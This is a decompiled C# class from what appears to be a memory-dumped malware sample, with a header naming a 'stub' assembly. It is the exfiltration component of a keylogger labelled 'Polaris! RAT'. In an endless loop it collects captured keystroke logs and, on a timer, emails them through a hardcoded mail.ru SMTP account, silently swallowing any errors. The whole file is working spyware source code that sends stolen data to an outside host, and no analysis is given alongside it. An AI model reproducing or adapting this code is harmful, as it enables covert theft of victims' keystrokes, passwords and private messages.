// Decompiled with JetBrains decompiler
// Type: j.Enviar
// Assembly: stub, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 5D061B43-92C3-47A8-A000-0E762F8D5CF4
// Assembly location: C:\Users\gorno\Desktop\vm\Dumps\UnknownName\vdump_00400000.exe

using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Net;
using System.Net.Mail;
using System.Threading;

namespace j
{
  public class Enviar
  {
    public static string H = "smtp.mail.ru";
    public static string E = "ow@mail.ru";
    public static string S = "password";
    public static string P = "587";
    public static string T = "60";
    public static string ss = "True";

    public void SEND()
    {
      try
      {
        while (true)
        {
          kl.Logs_E = "";
          Thread.Sleep(checked (60000 * Convert.ToInt32(Enviar.T)));
          string logsE = kl.Logs_E;
          SmtpClient smtpClient = new SmtpClient();
          MailMessage mailMessage = new MailMessage();
          int num1 = 0;
          smtpClient.UseDefaultCredentials = num1 != 0;
          NetworkCredential networkCredential = new NetworkCredential(Enviar.E, Enviar.S);
          smtpClient.Credentials = (ICredentialsByHost) networkCredential;
          int int32 = Convert.ToInt32(Enviar.P);
          smtpClient.Port = int32;
          int num2 = Enviar.SSL() ? 1 : 0;
          smtpClient.EnableSsl = num2 != 0;
          string h = Enviar.H;
          smtpClient.Host = h;
          MailMessage message = new MailMessage()
          {
            From = new MailAddress(Enviar.E),
            To = {
              Enviar.E
            },
            Subject = "Polaris! RAT || Sucesso!",
            IsBodyHtml = true,
            Body = logsE
          };
          smtpClient.Send(message);
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    private static bool SSL()
    {
      return Operators.CompareString(Enviar.ss, "True", false) == 0;
    }
  }
}
